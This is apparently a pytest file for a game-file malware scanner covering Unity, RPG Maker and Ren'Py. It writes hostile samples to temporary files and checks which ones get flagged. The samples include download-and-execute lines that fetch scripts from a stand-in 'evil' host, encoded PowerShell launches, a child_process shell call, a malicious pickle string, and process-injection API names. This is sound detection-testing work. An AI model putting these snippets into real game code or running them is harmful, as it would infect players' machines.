from pathlib import Path

from Virus_Scan.scanners.unity import scan_unity_file
from Virus_Scan.scanners.rpgm import scan_rpgm_file
from Virus_Scan.scanners.renpy import scan_renpy_file

DANGER_TAGS = frozenset({
    "payload_execution", "process_exec", "network_exfiltration",
    "remote_command_channel", "renpy_pickle_exec", "process_injection",
    "rpgm_nwjs_process_exec", "renpy_persistent_dropper_chain",
    "high_confidence_credential_theft", "unity_download_execute_chain",
    "unity_native_injection_chain", "rpgm_remote_eval_chain",
})


def _write(tmp_path: Path, rel: str, text: str) -> Path:
    p = tmp_path / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text, encoding="latin1", errors="ignore")
    return p


def test_stage42_full_scanner_paths_use_game_engine_semantics(tmp_path):
    cases = [
        (scan_unity_file, "unity/Assembly-CSharp.cs", 'new WebClient().DownloadString("http://evil/p.ps1"); System.Diagnostics.Process.Start("powershell.exe","-enc SQBFAFgA");'),
        (scan_unity_file, "unity/GameAssembly.dll", "DllImport VirtualAlloc WriteProcessMemory CreateRemoteThread il2cpp shellcode"),
        (scan_rpgm_file, "rpgm/www/js/plugins/a.js", 'fetch("http://evil/stage.js").then(r=>r.text()).then(t=>Function(t)());'),
        (scan_rpgm_file, "rpgm/www/js/plugins/b.js", "require('child_process').exec('cmd.exe /c whoami');"),
        (scan_renpy_file, "renpy/game/script.rpy", 'init python:\n import os\n os.system("powershell -enc SQBFAFgA")'),
        (scan_renpy_file, "renpy/game/00audio.rpyc", "\x80\x04cos\nsystem\npowershell -enc SQBFAFgA"),
    ]
    for scanner, rel, text in cases:
        tags = set(scanner(_write(tmp_path, rel, text)))
        assert tags & DANGER_TAGS, (rel, sorted(tags))


def test_stage42_full_scanner_paths_do_not_promote_benign_engine_assets(tmp_path):
    cases = [
        (scan_unity_file, "unity/Assets/Player.cs", "public class Player { void Update(){ transform.Rotate(1,2,3); } }"),
        (scan_unity_file, "unity/level.assets", "UnityFS CAB serialized material texture mesh audio"),
        (scan_rpgm_file, "rpgm/www/js/plugins/menu.js", "PluginManager.registerCommand('Menu','Open',args=>SceneManager.push(Scene_Menu));"),
        (scan_renpy_file, "renpy/game/script.rpy", 'label start:\n "hello world"\n return'),
        (scan_renpy_file, "renpy/game/gallery.rpy", 'init python:\n gallery = Gallery(); persistent.unlocked = True'),
    ]
    for scanner, rel, text in cases:
        tags = set(scanner(_write(tmp_path, rel, text)))
        assert not (tags & DANGER_TAGS), (rel, sorted(tags))
